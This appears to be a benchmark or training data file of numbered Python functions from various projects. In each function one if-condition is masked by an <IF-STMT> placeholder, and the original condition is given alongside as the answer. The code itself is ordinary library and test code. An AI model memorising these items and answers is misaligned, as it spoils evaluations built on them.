1763,"def _parse_abbrev_table(self):<tab>""""""Parse the abbrev table from the stream""""""<tab>map = {}<tab>self.stream.seek(self.offset)<tab>while True:<tab><tab>decl_code = struct_parse(<tab><tab><tab>struct=self.structs.Dwarf_uleb128(""""), stream=self.stream<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>break<tab><tab>declaration = struct_parse(<tab><tab><tab>struct=self.structs.Dwarf_abbrev_declaration, stream=self.stream<tab><tab>)<tab><tab>map[decl_code] = AbbrevDecl(decl_code, declaration)<tab>return map",if decl_code == 0 :,157
1764,"def mFRIDAY(<tab>self,):<tab>try:<tab><tab>_type = FRIDAY<tab><tab>_channel = DEFAULT_CHANNEL<tab><tab>pass<tab><tab>self.match(""fri"")<tab><tab>alt10 = 2<tab><tab>LA10_0 = self.input.LA(1)<tab><tab>if LA10_0 == 100:<tab><tab><tab>alt10 = 1<tab><tab><IF-STMT><tab><tab><tab>pass<tab><tab><tab>self.match(""day"")<tab><tab>self._state.type = _type<tab><tab>self._state.channel = _channel<tab>finally:<tab><tab>pass",if alt10 == 1 :,144
1765,"def __getattr__(self, key):<tab>from mongokit.schema_document import i18n<tab>if key in self:<tab><tab>if isinstance(self[key], i18n):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return self[key].get(self._doc._fallback_lang)<tab><tab><tab>return self[key][self._doc._current_lang]<tab><tab>return self[key]",if self . _doc . _current_lang not in self [ key ] :,108
1766,"def compact_repr(record):<tab>parts = []<tab>for key in record.__attributes__:<tab><tab>value = getattr(record, key)<tab><tab>if not value:<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>value = HIDE_LIST<tab><tab>elif key == FEATS:<tab><tab><tab>value = format_feats(value)<tab><tab>else:<tab><tab><tab>value = repr(value)<tab><tab>value = capped_str(value)<tab><tab>parts.append(""%s=%s"" % (key, value))<tab>return ""%s(%s)"" % (record.__class__.__name__, "", "".join(parts))","if isinstance ( value , list ) :",152
1767,"def pre_validate(self, form):<tab>if self.data:<tab><tab>values = list(c[0] for c in self.choices)<tab><tab>for d in self.data:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise ValueError(<tab><tab><tab><tab><tab>self.gettext(u""'%(value)s' is not a valid choice for this field"")<tab><tab><tab><tab><tab>% dict(value=d)<tab><tab><tab><tab>)",if d not in values :,108
1768,"def _sql_like_to_regex(pattern, escape):<tab>cur_i = 0<tab>pattern_length = len(pattern)<tab>while cur_i < pattern_length:<tab><tab>nxt_i = cur_i + 1<tab><tab>cur = pattern[cur_i]<tab><tab>nxt = pattern[nxt_i] if nxt_i < pattern_length else None<tab><tab>skip = 1<tab><tab>if nxt is not None and escape is not None and cur == escape:<tab><tab><tab>yield nxt<tab><tab><tab>skip = 2<tab><tab><IF-STMT><tab><tab><tab>yield "".*""<tab><tab>elif cur == ""_"":<tab><tab><tab>yield "".""<tab><tab>else:<tab><tab><tab>yield cur<tab><tab>cur_i += skip","elif cur == ""%"" :",169
1769,"def find_caller(stack):<tab>""""""Finds info about first non-sqlalchemy call in stack""""""<tab>for frame in stack:<tab><tab># We don't care about sqlalchemy internals<tab><tab>module = inspect.getmodule(frame[0])<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>if module.__name__.startswith(""sqlalchemy""):<tab><tab><tab>continue<tab><tab>return (module.__name__,) + tuple(frame[2:4]) + (frame[4][0].strip(),)<tab>log.warning(""Transaction from unknown origin"")<tab>return None, None, None, None","if not hasattr ( module , ""__name__"" ) :",137
1770,"def _get_normal_median_depth(normal_counts):<tab>depths = []<tab>with open(normal_counts) as in_handle:<tab><tab>header = None<tab><tab>for line in in_handle:<tab><tab><tab>if header is None and not line.startswith(""@""):<tab><tab><tab><tab>header = line.strip().split()<tab><tab><tab><IF-STMT><tab><tab><tab><tab>n_vals = dict(zip(header, line.strip().split()))<tab><tab><tab><tab>depths.append(int(n_vals[""REF_COUNT""]) + int(n_vals[""ALT_COUNT""]))<tab>return np.median(depths)",elif header :,145
1771,"def get_pool(self, *args, **kw):<tab>key = self._serialize(*args, **kw)<tab>try:<tab><tab>return self.pools[key]<tab>except KeyError:<tab><tab>self._create_pool_mutex.acquire()<tab><tab>try:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>kw.pop(""sa_pool_key"", None)<tab><tab><tab><tab>pool = self.poolclass(<tab><tab><tab><tab><tab>lambda: self.module.connect(*args, **kw), **self.kw<tab><tab><tab><tab>)<tab><tab><tab><tab>self.pools[key] = pool<tab><tab><tab><tab>return pool<tab><tab><tab>else:<tab><tab><tab><tab>return self.pools[key]<tab><tab>finally:<tab><tab><tab>self._create_pool_mutex.release()",if key not in self . pools :,193
1772,"def add(self, field, value, boost=None):<tab>match = {""value"": value}<tab>if boost:<tab><tab><IF-STMT><tab><tab><tab>match[""boost""] = boost<tab><tab>else:<tab><tab><tab>match[""boost""] = float(boost)<tab><tab>self._values[field] = match<tab><tab>return<tab>self._values[field] = value","if isinstance ( boost , ( float , int ) ) :",94
1773,"def get_shape(shape):<tab>""""""Convert the shape to correct dtype and vars.""""""<tab>ret = []<tab>for dim in shape:<tab><tab>if isinstance(dim, tvm.tir.IntImm):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>ret.append(dim)<tab><tab><tab>else:<tab><tab><tab><tab>val = int(dim)<tab><tab><tab><tab>assert val <= np.iinfo(np.int32).max<tab><tab><tab><tab>ret.append(tvm.tir.IntImm(""int32"", val))<tab><tab>elif isinstance(dim, tvm.tir.Any):<tab><tab><tab>ret.append(te.var(""any_dim"", ""int32""))<tab><tab>else:<tab><tab><tab>ret.append(dim)<tab>return ret","if libinfo ( ) [ ""INDEX_DEFAULT_I64"" ] == ""ON"" :",194
1774,"def _find_icacls_exe():<tab>if os.name == ""nt"":<tab><tab>paths = [<tab><tab><tab>os.path.expandvars(r""%windir%\{0}"").format(subdir)<tab><tab><tab>for subdir in (""system32"", ""SysWOW64"")<tab><tab>]<tab><tab>for path in paths:<tab><tab><tab>icacls_path = next(<tab><tab><tab><tab>iter(fn for fn in os.listdir(path) if fn.lower() == ""icacls.exe""), None<tab><tab><tab>)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>icacls_path = os.path.join(path, icacls_path)<tab><tab><tab><tab>return icacls_path<tab>return None",if icacls_path is not None :,177
1775,"def mlt_version_is_greater_correct(test_version):<tab>runtime_ver = mlt_version.split(""."")<tab>test_ver = test_version.split(""."")<tab>if runtime_ver[0] > test_ver[0]:<tab><tab>return True<tab>elif runtime_ver[0] == test_ver[0]:<tab><tab>if runtime_ver[1] > test_ver[1]:<tab><tab><tab>return True<tab><tab>elif runtime_ver[1] == test_ver[1]:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return True<tab>return False",if runtime_ver [ 2 ] > test_ver [ 2 ] :,148
1776,"def get_ready_conn(self, host):<tab>conn = None<tab>self._lock.acquire()<tab>try:<tab><tab>if host in self._hostmap:<tab><tab><tab>for c in self._hostmap[host]:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>self._readymap[c] = 0<tab><tab><tab><tab><tab>conn = c<tab><tab><tab><tab><tab>break<tab>finally:<tab><tab>self._lock.release()<tab>return conn",if self . _readymap [ c ] :,115
1777,"def to_svc_hst_distinct_lists(ref, tab):<tab>r = {""hosts"": [], ""services"": []}<tab>for e in tab:<tab><tab>cls = e.__class__<tab><tab><IF-STMT><tab><tab><tab>name = e.get_dbg_name()<tab><tab><tab>r[""services""].append(name)<tab><tab>else:<tab><tab><tab>name = e.get_dbg_name()<tab><tab><tab>r[""hosts""].append(name)<tab>return r","if cls . my_type == ""service"" :",119
1778,"def playerData(s):<tab>""""""Returns a list of tuples of original string and dict of values""""""<tab>p = []<tab>i = 0<tab>while True:<tab><tab>match = re_input.match(s, pos=i)<tab><tab>if match is None:<tab><tab><tab>return p<tab><tab>else:<tab><tab><tab>d = match.groupdict()<tab><tab><tab><IF-STMT><tab><tab><tab><tab>d[""degree""], d[""kwargs""] = getArgs(d[""args""])<tab><tab><tab>else:<tab><tab><tab><tab>d[""degree""], d[""kwargs""] = """", {}<tab><tab><tab>del d[""args""]<tab><tab><tab>p.append((match.group().strip(), d))<tab><tab><tab>i = match.end()<tab>return","if d [ ""args"" ] is not None :",178
1779,"def _params_for_TXT(self, record):<tab>for value in record.values:<tab><tab>field_type = ""TXT""<tab><tab><IF-STMT><tab><tab><tab>field_type = ""DKIM""<tab><tab><tab>value = value.replace(""\\;"", "";"")<tab><tab>yield {<tab><tab><tab>""target"": value,<tab><tab><tab>""subDomain"": record.name,<tab><tab><tab>""ttl"": record.ttl,<tab><tab><tab>""fieldType"": field_type,<tab><tab>}",if self . _is_valid_dkim ( value ) :,126
1780,"def create(self, values):<tab>conn = self.get_connection()<tab>object_classes = self.structural_classes + [self.object_class]<tab>attrs = [(""objectClass"", object_classes)]<tab>for k, v in values.iteritems():<tab><tab>if k == ""id"" or k in self.attribute_ignore:<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>attr_type = self.attribute_mapping.get(k, k)<tab><tab><tab>attrs.append((attr_type, [v]))<tab>if ""groupOfNames"" in object_classes and self.use_dumb_member:<tab><tab>attrs.append((""member"", [self.DUMB_MEMBER_DN]))<tab>conn.add_s(self._id_to_dn(values[""id""]), attrs)<tab>return values",if v is not None :,196
1781,"def get_new_unlinked_nodes(<tab>before_inputted_nodes, before_input_sockets, input_sockets, nodes_dict):<tab>affected_nodes = []<tab>for node_id, socket in zip(before_inputted_nodes, before_input_sockets):<tab><tab>if not socket in input_sockets:<tab><tab><tab># if the node has been deleted it is not affected<tab><tab><tab>if node_id in nodes_dict:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>affected_nodes.append(node_id)<tab>return affected_nodes",if not node_id in affected_nodes :,141
1782,"def show_panel(panel_id):<tab># Iterate positions to find where panel is and bring it to front.<tab>for position in _positions_names:<tab><tab>pos_panel_ids = _get_position_panels(position)<tab><tab>if len(pos_panel_ids) == 0:<tab><tab><tab>continue<tab><tab>if len(pos_panel_ids) == 1:<tab><tab><tab>continue<tab><tab>panel_widget = _get_panels_widgets_dict(gui.editor_window)[panel_id]<tab><tab>notebook = _position_notebooks[position]<tab><tab>for i in range(0, notebook.get_n_pages()):<tab><tab><tab>notebook_page = notebook.get_nth_page(i)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>notebook.set_current_page(i)",if notebook_page == panel_widget :,197
1783,"def merge(self, abort=False, message=None):<tab>""""""Merge remote branch or reverts the merge.""""""<tab>if abort:<tab><tab>self.execute([""update"", ""--clean"", "".""])<tab>elif self.needs_merge():<tab><tab><IF-STMT><tab><tab><tab>self.execute([""update"", ""--clean"", ""remote(.)""])<tab><tab>else:<tab><tab><tab>self.configure_merge()<tab><tab><tab># Fallback to merge<tab><tab><tab>try:<tab><tab><tab><tab>self.execute([""merge"", ""-r"", ""remote(.)""])<tab><tab><tab>except RepositoryException as error:<tab><tab><tab><tab>if error.retcode == 255:<tab><tab><tab><tab><tab># Nothing to merge<tab><tab><tab><tab><tab>return<tab><tab><tab><tab>raise<tab><tab><tab>self.execute([""commit"", ""--message"", ""Merge""])",if self . needs_ff ( ) :,191
1784,"def runButtons(action):<tab>global sqlUpdate<tab>if action == ""Clear"":<tab><tab>app.text(LABS[""run""], replace=True)<tab><tab>app.message(LABS[""run""], """", bg=""grey"")<tab><tab>log(""SQL cleared"")<tab>elif action == ""Run"":<tab><tab>app.message(LABS[""run""], """")<tab><tab>sql = app.text(LABS[""run""]).strip()<tab><tab><IF-STMT><tab><tab><tab>runSql(sql)<tab><tab>else:<tab><tab><tab>app.message(LABS[""run""], """", bg=""grey"")<tab>app.text(LABS[""run""], focus=True)",if len ( sql ) > 0 :,156
1785,"def receive_loop(self):<tab>while not self._stoped:<tab><tab>try:<tab><tab><tab>rd, _, _ = select.select([self.teredo_sock], [], [], 0.5)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.receive_ra_packet()<tab><tab>except Exception as e:<tab><tab><tab>logger.exception(""receive procedure fail once: %r"", e)<tab><tab><tab>pass",if rd and not self . _stoped :,105
1786,"def add_items(self, model, objs):<tab>search_fields = model.get_search_fields()<tab>if not search_fields:<tab><tab>return<tab>indexers = [ObjectIndexer(obj, self.backend) for obj in objs]<tab># TODO: Delete unindexed objects while dealing with proxy models.<tab>if indexers:<tab><tab>content_type_pk = get_content_type_pk(model)<tab><tab>update_method = (<tab><tab><tab>self.add_items_upsert<tab><tab><tab><IF-STMT><tab><tab><tab>else self.add_items_update_then_create<tab><tab>)<tab><tab>update_method(content_type_pk, indexers)",if self . _enable_upsert,160
1787,"def __init__(self, service: RestClient, **k_args: Dict[str, str]):<tab>self.path: str = None<tab>self.httpMethod: str = None<tab>self.service: RestClient = service<tab>self.__dict__.update(k_args)<tab>self.path_args: List[str] = []<tab>self.query_args: List[str] = []<tab>if hasattr(self, ""parameters""):<tab><tab>for key, value in self.parameters.items():<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.path_args.append(key)<tab><tab><tab>else:<tab><tab><tab><tab>self.query_args.append(key)","if value [ ""location"" ] == ""path"" :",165
1788,"def insertion_unsort(str, extended):<tab>""""""3.2 Insertion unsort coding""""""<tab>oldchar = 0x80<tab>result = []<tab>oldindex = -1<tab>for c in extended:<tab><tab>index = pos = -1<tab><tab>char = ord(c)<tab><tab>curlen = selective_len(str, char)<tab><tab>delta = (curlen + 1) * (char - oldchar)<tab><tab>while 1:<tab><tab><tab>index, pos = selective_find(str, c, index, pos)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>break<tab><tab><tab>delta += index - oldindex<tab><tab><tab>result.append(delta - 1)<tab><tab><tab>oldindex = index<tab><tab><tab>delta = 0<tab><tab>oldchar = char<tab>return result",if index == - 1 :,190
1789,"def get_sorted_entry(field, bookid):<tab>if field == ""title"" or field == ""authors"":<tab><tab>book = calibre_db.get_filtered_book(bookid)<tab><tab>if book:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return json.dumps({""sort"": book.sort})<tab><tab><tab>elif field == ""authors"":<tab><tab><tab><tab>return json.dumps({""author_sort"": book.author_sort})<tab>return """"","if field == ""title"" :",111
1790,"def _convert_tstamp(out):<tab># Searches for top-level timestamp attributes or within dictionaries<tab>if ""timestamp"" in out:<tab><tab># Convert UNIX to datetime object<tab><tab>f = float(out[""timestamp""])<tab><tab>out[""timestamp""] = datetime.fromtimestamp(f / 1000)<tab>else:<tab><tab>for ticker, data in out.items():<tab><tab><tab><IF-STMT><tab><tab><tab><tab>f = float(data[""timestamp""])<tab><tab><tab><tab>data[""timestamp""] = datetime.fromtimestamp(f / 1000)<tab><tab><tab><tab>out[ticker] = data<tab>return out","if ""timestamp"" in data :",142
1791,"def write_urls(self, person):<tab>""""""Write URL and EMAIL properties of a VCard.""""""<tab>url_list = person.get_url_list()<tab>for url in url_list:<tab><tab>href = url.get_path()<tab><tab><IF-STMT><tab><tab><tab>if url.get_type() == UrlType(UrlType.EMAIL):<tab><tab><tab><tab>if href.startswith(""mailto:""):<tab><tab><tab><tab><tab>href = href[len(""mailto:"") :]<tab><tab><tab><tab>self.writeln(""EMAIL:%s"" % self.esc(href))<tab><tab><tab>else:<tab><tab><tab><tab>self.writeln(""URL:%s"" % self.esc(href))",if href :,158
1792,"def get_range(min, max):<tab>if max < min:<tab><tab>min, max = max, min<tab>elif min == max:<tab><tab><IF-STMT><tab><tab><tab>min, max = 2 * min, 0<tab><tab>elif min > 0:<tab><tab><tab>min, max = 0, 2 * min<tab><tab>else:<tab><tab><tab>min, max = -1, 1<tab>return min, max",if min < 0 :,99
1793,"def __init__(self, mapping=None):<tab>if isinstance(mapping, MultiDict):<tab><tab>dict.__init__(self, ((k, l[:]) for k, l in mapping.iterlists()))<tab>elif isinstance(mapping, dict):<tab><tab>tmp = {}<tab><tab>for key, value in mapping.iteritems():<tab><tab><tab><IF-STMT><tab><tab><tab><tab>value = list(value)<tab><tab><tab>else:<tab><tab><tab><tab>value = [value]<tab><tab><tab>tmp[key] = value<tab><tab>dict.__init__(self, tmp)<tab>else:<tab><tab>tmp = {}<tab><tab>for key, value in mapping or ():<tab><tab><tab>tmp.setdefault(key, []).append(value)<tab><tab>dict.__init__(self, tmp)","if isinstance ( value , ( tuple , list ) ) :",182
1794,"def modified_precision(candidate, references, n):<tab>candidate_ngrams = list(ngrams(candidate, n))<tab>if len(candidate_ngrams) == 0:<tab><tab>return 0<tab>c_words = set(candidate_ngrams)<tab>for word in c_words:<tab><tab>count_w = candidate_ngrams.count(word) + 1<tab><tab>count_max = 0<tab><tab>for reference in references:<tab><tab><tab>reference_ngrams = list(ngrams(reference, n))<tab><tab><tab>count = reference_ngrams.count(word) + 1<tab><tab><tab><IF-STMT><tab><tab><tab><tab>count_max = count<tab>return min(count_w, count_max) / (len(candidate) + len(c_words))",if count > count_max :,176
1795,"def reverse_adjust_line_according_to_hunks(self, hunks, line):<tab>for hunk in reversed(hunks):<tab><tab>head_start = hunk.head_start<tab><tab>saved_start = hunk.saved_start<tab><tab>if hunk.saved_length == 0:<tab><tab><tab>saved_start += 1<tab><tab>elif hunk.head_length == 0:<tab><tab><tab>saved_start -= 1<tab><tab>head_end = head_start + hunk.head_length<tab><tab>saved_end = saved_start + hunk.saved_length<tab><tab>if saved_end <= line:<tab><tab><tab>return head_end + line - saved_end<tab><tab><IF-STMT><tab><tab><tab>return head_start<tab># fails to find matching<tab>return line",elif saved_start <= line :,193
1796,"def indent_xml(elem, level=0):<tab>""""""Do our pretty printing and make Matt very happy.""""""<tab>i = ""\n"" + level * ""  ""<tab>if elem:<tab><tab>if not elem.text or not elem.text.strip():<tab><tab><tab>elem.text = i + ""  ""<tab><tab><IF-STMT><tab><tab><tab>elem.tail = i<tab><tab>for elem in elem:<tab><tab><tab>indent_xml(elem, level + 1)<tab><tab>if not elem.tail or not elem.tail.strip():<tab><tab><tab>elem.tail = i<tab>else:<tab><tab>if level and (not elem.tail or not elem.tail.strip()):<tab><tab><tab>elem.tail = i",if not elem . tail or not elem . tail . strip ( ) :,177
1797,"def test_infer_shape_matrix(self):<tab># Testing the infer_shape with a matrix.<tab>x = theano.tensor.matrix()<tab>for op in self.ops:<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>if op.return_index:<tab><tab><tab>f = op(x)[2]<tab><tab>else:<tab><tab><tab>f = op(x)[1]<tab><tab>self._compile_and_check(<tab><tab><tab>[x],<tab><tab><tab>[f],<tab><tab><tab>[np.asarray(np.array([[2, 1], [3, 2], [2, 3]]), dtype=config.floatX)],<tab><tab><tab>self.op_class,<tab><tab>)",if not op . return_inverse :,170
1798,"def drop_lists(value):<tab>out = {}<tab>for key, val in value.items():<tab><tab>val = val[0]<tab><tab>if isinstance(key, bytes):<tab><tab><tab>key = str(key, ""utf-8"")<tab><tab><IF-STMT><tab><tab><tab>val = str(val, ""utf-8"")<tab><tab>out[key] = val<tab>return out","if isinstance ( val , bytes ) :",96
1799,"def malloc(self, size):<tab># return a block of right size (possibly rounded up)<tab>assert 0 <= size < sys.maxsize<tab>if os.getpid() != self._lastpid:<tab><tab>self.__init__()  # reinitialize after fork<tab>with self._lock:<tab><tab>self._free_pending_blocks()<tab><tab>size = self._roundup(max(size, 1), self._alignment)<tab><tab>(arena, start, stop) = self._malloc(size)<tab><tab>new_stop = start + size<tab><tab><IF-STMT><tab><tab><tab>self._free((arena, new_stop, stop))<tab><tab>block = (arena, start, new_stop)<tab><tab>self._allocated_blocks.add(block)<tab><tab>return block",if new_stop < stop :,188
1800,"def ContinueStatement(self, label, **kwargs):<tab>if label is None:<tab><tab>self.emit(""JUMP"", self.implicit_continues[-1])<tab>else:<tab><tab>label = label.get(""name"")<tab><tab><IF-STMT><tab><tab><tab>raise MakeError(""SyntaxError"", ""Undefined label '%s'"" % label)<tab><tab>else:<tab><tab><tab>self.emit(""JUMP"", self.declared_continue_labels[label])",if label not in self . declared_continue_labels :,111
1801,"def parse_counter_style_name(tokens, counter_style):<tab>tokens = remove_whitespace(tokens)<tab>if len(tokens) == 1:<tab><tab>(token,) = tokens<tab><tab><IF-STMT><tab><tab><tab>if token.lower_value in (""decimal"", ""disc""):<tab><tab><tab><tab>if token.lower_value not in counter_style:<tab><tab><tab><tab><tab>return token.value<tab><tab><tab>elif token.lower_value != ""none"":<tab><tab><tab><tab>return token.value","if token . type == ""ident"" :",122
1802,"def __call__(self, data):<tab>num_points = data.pos.shape[0]<tab>new_data = Data()<tab>for key in data.keys:<tab><tab>if key == KDTREE_KEY:<tab><tab><tab>continue<tab><tab>item = data[key]<tab><tab><IF-STMT><tab><tab><tab>item = item[self._indices].clone()<tab><tab>elif torch.is_tensor(item):<tab><tab><tab>item = item.clone()<tab><tab>setattr(new_data, key, item)<tab>return new_data",if torch . is_tensor ( item ) and num_points == item . shape [ 0 ] :,144
1803,"def HandleEvent(self, event):<tab>e_id = event.GetId()<tab>if e_id in self.handlers:<tab><tab>handler = self.handlers[e_id]<tab><tab>try:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return handler(event)<tab><tab>except RuntimeError:<tab><tab><tab>self.RemoveHandlerForID(e_id)<tab>else:<tab><tab>event.Skip()<tab>return False",if handler :,102
1804,"def try_append_extension(self, path):<tab>append_setting = self.get_append_extension_setting()<tab>if self.settings.get(append_setting, False):<tab><tab>if not self.is_copy_original_name(path):<tab><tab><tab>_, new_path_extension = os.path.splitext(path)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>argument_name = self.get_argument_name()<tab><tab><tab><tab>if argument_name is None:<tab><tab><tab><tab><tab>_, extension = os.path.splitext(self.view.file_name())<tab><tab><tab><tab>else:<tab><tab><tab><tab><tab>_, extension = os.path.splitext(argument_name)<tab><tab><tab><tab>path += extension<tab>return path","if new_path_extension == """" :",181
1805,"def _get_namespace(self, gl_client, gl_namespace, lazy=False):<tab>try:<tab><tab><IF-STMT><tab><tab><tab>return gl_client.groups.get(gl_namespace.attributes[""id""], lazy=lazy)<tab><tab>if gl_namespace.attributes[""kind""] == ""user"":<tab><tab><tab>return gl_client.users.get(gl_client.user.attributes[""id""], lazy=lazy)<tab><tab># Note: This doesn't seem to work for IDs retrieved via the namespaces API; the IDs are<tab><tab># different.<tab><tab>return gl_client.users.get(gl_namespace.attributes[""id""], lazy=lazy)<tab>except gitlab.GitlabGetError:<tab><tab>return None","if gl_namespace . attributes [ ""kind"" ] == ""group"" :",179
1806,"def removeReadOnly(self, files):<tab># Removes all read-on ly flags in a for all files<tab>for filepath in files:<tab><tab><IF-STMT><tab><tab><tab># Windows only needs S_IWRITE, but we bitwise-or with current perms to preserve other permission bits on Linux<tab><tab><tab>os.chmod(filepath, stat.S_IWRITE | os.stat(filepath).st_mode)",if os . path . isfile ( filepath ) :,99
1807,"def initiate_all_local_variables_instances(<tab>nodes, local_variables_instances, all_local_variables_instances):<tab>for node in nodes:<tab><tab><IF-STMT><tab><tab><tab>new_var = LocalIRVariable(node.variable_declaration)<tab><tab><tab>if new_var.name in all_local_variables_instances:<tab><tab><tab><tab>new_var.index = all_local_variables_instances[new_var.name].index + 1<tab><tab><tab>local_variables_instances[node.variable_declaration.name] = new_var<tab><tab><tab>all_local_variables_instances[node.variable_declaration.name] = new_var",if node . variable_declaration :,158
1808,"def find_comment(line):<tab>""""""Finds the index of a comment # and returns None if not found""""""<tab>instring, instring_char = False, """"<tab>for i, char in enumerate(line):<tab><tab><IF-STMT><tab><tab><tab>if instring:<tab><tab><tab><tab>if char == instring_char:<tab><tab><tab><tab><tab>instring = False<tab><tab><tab><tab><tab>instring_char = """"<tab><tab><tab>else:<tab><tab><tab><tab>instring = True<tab><tab><tab><tab>instring_char = char<tab><tab>elif char == ""#"":<tab><tab><tab>if not instring:<tab><tab><tab><tab>return i<tab>return None","if char in ( '""' , ""'"" ) :",155
1809,"def set_study_system_attr(self, study_id: int, key: str, value: Any) -> None:<tab>with _create_scoped_session(self.scoped_session, True) as session:<tab><tab>study = models.StudyModel.find_or_raise_by_id(study_id, session)<tab><tab>attribute = models.StudySystemAttributeModel.find_by_study_and_key(<tab><tab><tab>study, key, session<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>attribute = models.StudySystemAttributeModel(<tab><tab><tab><tab>study_id=study_id, key=key, value_json=json.dumps(value)<tab><tab><tab>)<tab><tab><tab>session.add(attribute)<tab><tab>else:<tab><tab><tab>attribute.value_json = json.dumps(value)",if attribute is None :,196
1810,"def clear_doc(self, docname: str) -> None:<tab>for sChild in self._children:<tab><tab>sChild.clear_doc(docname)<tab><tab>if sChild.declaration and sChild.docname == docname:<tab><tab><tab>sChild.declaration = None<tab><tab><tab>sChild.docname = None<tab><tab><tab>sChild.line = None<tab><tab><tab><IF-STMT><tab><tab><tab><tab>sChild.siblingAbove.siblingBelow = sChild.siblingBelow<tab><tab><tab>if sChild.siblingBelow is not None:<tab><tab><tab><tab>sChild.siblingBelow.siblingAbove = sChild.siblingAbove<tab><tab><tab>sChild.siblingAbove = None<tab><tab><tab>sChild.siblingBelow = None",if sChild . siblingAbove is not None :,189
1811,"def test_sum_values_list_group_by(self):<tab>ret = (<tab><tab>await Book.annotate(sum=Sum(""rating""))<tab><tab>.group_by(""author_id"")<tab><tab>.values_list(""author_id"", ""sum"")<tab>)<tab>for item in ret:<tab><tab>author_id = item[0]<tab><tab>sum_ = item[1]<tab><tab><IF-STMT><tab><tab><tab>self.assertEqual(sum_, 45.0)<tab><tab>elif author_id == self.a2.pk:<tab><tab><tab>self.assertEqual(sum_, 10.0)",if author_id == self . a1 . pk :,151
1812,"def save_claims_for_resolve(self, claim_infos):<tab>to_save = {}<tab>for info in claim_infos:<tab><tab>if ""value"" in info:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>to_save[info[""claim_id""]] = info<tab><tab>else:<tab><tab><tab>for key in (""certificate"", ""claim""):<tab><tab><tab><tab>if info.get(key, {}).get(""value""):<tab><tab><tab><tab><tab>to_save[info[key][""claim_id""]] = info[key]<tab>return self.save_claims(to_save.values())","if info [ ""value"" ] :",141
1813,"def utcoffset(self, dt):<tab>if not dst_only:<tab><tab>dt_n = dt.replace(tzinfo=None)<tab><tab><IF-STMT><tab><tab><tab>return timedelta(hours=-1)<tab>return timedelta(hours=0)","if dt_start <= dt_n < dt_end and getattr ( dt_n , ""fold"" , 0 ) :",80
1814,"def find_comment(line):<tab>""""""Finds the index of a comment # and returns None if not found""""""<tab>instring, instring_char = False, """"<tab>for i, char in enumerate(line):<tab><tab>if char in ('""', ""'""):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>if char == instring_char:<tab><tab><tab><tab><tab>instring = False<tab><tab><tab><tab><tab>instring_char = """"<tab><tab><tab>else:<tab><tab><tab><tab>instring = True<tab><tab><tab><tab>instring_char = char<tab><tab>elif char == ""#"":<tab><tab><tab>if not instring:<tab><tab><tab><tab>return i<tab>return None",if instring :,155
1815,"def __subclasshook__(cls, C):<tab>if cls is Coroutine:<tab><tab>mro = get_mro(C)<tab><tab>for method in (""__await__"", ""send"", ""throw"", ""close""):<tab><tab><tab>for base in mro:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>break<tab><tab><tab>else:<tab><tab><tab><tab>return NotImplemented<tab><tab>return True<tab>return NotImplemented",if method in base . __dict__ :,97
1816,"def GetFile(cls, session, sig, mode=""r""):<tab>sig = sig[: cls.HASH_LEN]<tab>while len(sig) > 0:<tab><tab>fn = cls.SaveFile(session, sig)<tab><tab>try:<tab><tab><tab>if os.path.exists(fn):<tab><tab><tab><tab>return (open(fn, mode), sig)<tab><tab>except (IOError, OSError):<tab><tab><tab>pass<tab><tab><IF-STMT><tab><tab><tab>sig = sig[:-1]<tab><tab>else:<tab><tab><tab>if ""r"" in mode:<tab><tab><tab><tab>return (None, sig)<tab><tab><tab>else:<tab><tab><tab><tab>return (open(fn, mode), sig)<tab># Not reached<tab>return (None, None)",if len ( sig ) > 1 :,180
1817,"def _store_pickle_output(self, pickle_output):<tab>if pickle_output:<tab><tab>if self.output_options.output is None:<tab><tab><tab>self.error(""Can't use without --output"", ""pickle-output"")<tab><tab><IF-STMT><tab><tab><tab>self.error(<tab><tab><tab><tab>""Must specify %s file for --output"" % load_pytd.PICKLE_EXT,<tab><tab><tab><tab>""pickle-output"",<tab><tab><tab>)<tab>self.output_options.pickle_output = pickle_output",elif not load_pytd . is_pickle ( self . output_options . output ) :,141
1818,"def the_func(*args, **kwargs):<tab>try:<tab><tab># Grab API version from type of controller<tab><tab>controller = args[0]<tab><tab>version = controller.version<tab><tab>return func(*args, **kwargs)<tab>except Exception as e:<tab><tab><IF-STMT><tab><tab><tab># Version-specific behaviour<tab><tab><tab>quantum_error_class = quantum_error_dict[version]<tab><tab><tab>raise quantum_error_class(e)<tab><tab># otherwise just re-raise<tab><tab>raise",if errors is not None and type ( e ) in errors :,133
1819,"def publish_create(cls, payload):<tab>try:<tab><tab><IF-STMT><tab><tab><tab>thread = eventlet.spawn(workflows.get_engine().process, payload)<tab><tab><tab>cls.threads.append(thread)<tab>except Exception:<tab><tab>traceback.print_exc()<tab><tab>print(payload)","if isinstance ( payload , wf_ex_db . WorkflowExecutionDB ) :",87
1820,"def get_suggestion(self, buffer: ""Buffer"", document: Document) -> Optional[Suggestion]:<tab>history = buffer.history<tab># Consider only the last line for the suggestion.<tab>text = document.text.rsplit(""\n"", 1)[-1]<tab># Only create a suggestion when this is not an empty line.<tab>if text.strip():<tab><tab># Find first matching line in history.<tab><tab>for string in reversed(list(history.get_strings())):<tab><tab><tab>for line in reversed(string.splitlines()):<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>return Suggestion(line[len(text) :])<tab>return None",if line . startswith ( text ) :,151
